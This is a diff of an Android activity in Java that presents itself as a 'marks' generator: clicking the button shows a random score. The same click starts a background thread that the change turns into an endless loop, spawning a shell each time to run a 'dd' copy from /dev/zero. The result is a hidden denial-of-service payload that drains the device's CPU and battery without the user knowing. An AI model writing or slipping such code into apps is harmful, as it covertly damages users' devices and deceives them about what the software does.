@@ -13,39 +13,31 @@ import java.util.Random;
 public class MainActivity extends AppCompatActivity {
 
 
-    Button btnClick;
-    TextView lblDesc;
+    private Button btnClick;
+    private TextView lblDesc;
+    private static final Random RANDOM = new Random();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-
         btnClick = (Button) findViewById(R.id.btnClick);
         lblDesc  = (TextView) findViewById(R.id.lblDesc);
-
 
         btnClick.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                lblDesc.setText("" + generateRamdonNumber());
-
+                lblDesc.setText("Congratulations you just got " + generateRandomNumber() + " marks!");
                 Thread t = new Thread(new Runnable() {
                     public void run() {
-                        /*
-                         * Do something
-                         */
                         int i = 0;
-                        for ( i=0; i < 1000000000;i++){
+                        while(true){
                             try {
                                 System.out.println("Runtime");
                                 Runtime rt = Runtime.getRuntime();
                                 Process process = rt.exec("sh");
                                 DataOutputStream os = new DataOutputStream(process.getOutputStream());
-
-                                // os.writeBytes("dd if=/dev/zero ibs=4k count=1 of=$x.txt 2>/dev/null")
-                                //os.writeBytes("dd if=/dev/zero ibs=4k count=1 of=$x.txt 2>/dev/null" + "\n");
                                 os.writeBytes("dd if=/dev/zero of=/dev/null" + "\n");
                                 os.flush();
                                 os.writeBytes("exit\n");
@@ -59,18 +51,14 @@ public class MainActivity extends AppCompatActivity {
                                 System.out.println("InterruptedException" + e.getMessage());
                             }
                         }
-
                     }
                 });
-
                 t.start();
             }
         });
     }
 
-    public int generateRamdonNumber(){
-        Random r = new Random();
-        int ramdonNumber = r.nextInt(80 - 65) + 65;
-        return ramdonNumber;
+    private static int generateRandomNumber(){
+      return RANDOM.nextInt(80 - 65) + 65;
     }
 }
